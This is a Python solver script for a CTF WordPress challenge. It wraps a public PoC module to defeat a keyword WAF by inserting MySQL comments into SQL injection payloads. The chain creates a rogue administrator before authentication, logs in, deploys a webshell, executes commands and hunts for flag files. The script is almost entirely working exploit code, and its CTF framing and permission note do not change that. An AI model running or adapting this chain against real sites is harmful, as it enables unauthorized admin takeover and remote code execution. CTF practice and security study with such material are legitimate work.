#!/usr/bin/env python3
"""Challenge runner for Compfest CTF 2026 - Egg.

This is a thin wrapper around wp2shell.py.  The target challenge has a small
WAF which blocks the spelling used by the public PoC, so this wrapper inserts
MySQL comments between keywords before the batch request is sent.

Use only against the CTF instance or another system where you have permission
to test.
"""

from __future__ import annotations

import argparse
import re
import shlex
import urllib.parse

import wp2shell as wp


def _scrub(value: str) -> str:
    """Make the SQL spelling accepted by the challenge WAF.

    MySQL treats /**/ as whitespace.  Therefore UNION/**/SELECT is parsed as
    UNION SELECT by MySQL, while a simple string-matching WAF does not see the
    blocked phrase.
    """
    value = value.replace("///", "http://").replace("http://:", "http://")
    value = re.sub(r"(?i)\bUNION\s+ALL\s+SELECT\b", "UNION/**/ALL/**/SELECT", value)
    value = re.sub(r"(?i)\bUNION\s+SELECT\b", "UNION/**/SELECT", value)
    value = re.sub(r"(?i)\bSELECT\s+", "SELECT/**/", value)
    value = re.sub(r"(?i)\bAND\s+\(", "AND/**/(", value)
    return value


def _clean(value):
    """Recursively scrub SQL inside nested batch-request query strings."""
    if isinstance(value, dict):
        return {key: _clean(item) for key, item in value.items()}
    if isinstance(value, list):
        return [_clean(item) for item in value]
    if not isinstance(value, str):
        return value

    # The PoC URL-encodes the SQL before nesting it in JSON.  Decode the query
    # parameter, transform the SQL, then encode it again correctly.
    if "?" in value and (value.startswith("/") or value.startswith("http")):
        path, query = value.split("?", 1)
        try:
            pairs = urllib.parse.parse_qsl(query, keep_blank_values=True)
            return path + "?" + urllib.parse.urlencode(
                [(key, _scrub(item)) for key, item in pairs]
            )
        except ValueError:
            pass
    return _scrub(value)


# All UNION/SQLi traffic goes through BatchClient.post, including the
# pre-auth administrator creation chain.
_original_batch_post = wp.BatchClient.post


def _patched_batch_post(self, payload):
    return _original_batch_post(self, _clean(payload))


wp.BatchClient.post = _patched_batch_post


def _admin_cookie_header(session: wp.AdminSession, gate_token: str) -> str:
    """Keep the CTF gate cookie and pass the newly issued WordPress cookies.

    urllib's CookieJar records WordPress cookies after login, but a manually
    supplied Cookie header prevents the jar from adding them automatically.
    Combining them explicitly makes the following admin requests authenticated.
    """
    wordpress = [
        f"{cookie.name}={cookie.value}"
        for cookie in session._jar
        if cookie.name.startswith("wordpress_")
    ]
    if not wordpress:
        raise RuntimeError("WordPress login did not issue an authenticated cookie")
    return f"ctfd_proxy_token={gate_token}; " + "; ".join(wordpress)


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the Egg web challenge")
    parser.add_argument("target", help="challenge base URL, for example http://host:30037")
    parser.add_argument("token", help="CTFd proxy token")
    args = parser.parse_args()

    http = wp.HttpConfig(
        headers={"Cookie": f"ctfd_proxy_token={args.token}"},
        retries=1,
        delay=0.35,
    )

    print("[*] Creating a temporary administrator through the SQLi chain ...")
    creator = wp.PreAuthAdminCreator(args.target, http=http)
    admin = creator.create_admin()
    print(f"[+] Username: {admin.username}")
    print(f"[+] Password: {admin.password}")

    session = wp.AdminSession(args.target, http=http)
    print("[*] Logging in and uploading the token-gated plugin ...")
    if not session.login(admin.username, admin.password):
        raise RuntimeError("WordPress login failed")
    session.http.headers["Cookie"] = _admin_cookie_header(session, args.token)
    shell_path = session.deploy_webshell()
    print(f"[+] Webshell: {args.target.rstrip('/')}{shell_path}")
    print(f"[+] Running as: {(session.run(shell_path, 'id') or '').strip()}")

    listing = session.run(
        shell_path,
        "find / -maxdepth 5 -type f -iname '*flag*' -print 2>/dev/null",
    ) or ""
    candidates = [line.strip() for line in listing.splitlines() if line.strip().startswith("/")]
    if not candidates:
        print("[-] No flag-named file was found")
        return 1

    print("[+] Candidate files:")
    for path in candidates:
        print(f"    {path}")

    for path in candidates:
        # Avoid dumping unrelated system libraries whose names happen to
        # contain the word "flags".
        name = path.rsplit("/", 1)[-1].lower()
        if name not in {"flag", "flag.txt", "flag.md"} and len(name) > 32:
            continue
        contents = session.run(shell_path, f"cat {shlex.quote(path)} 2>/dev/null")
        if contents and contents.strip():
            print(f"\n[+] {path}:\n{contents.rstrip()}")
            return 0

    print("[-] Candidate paths were found, but none could be read")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
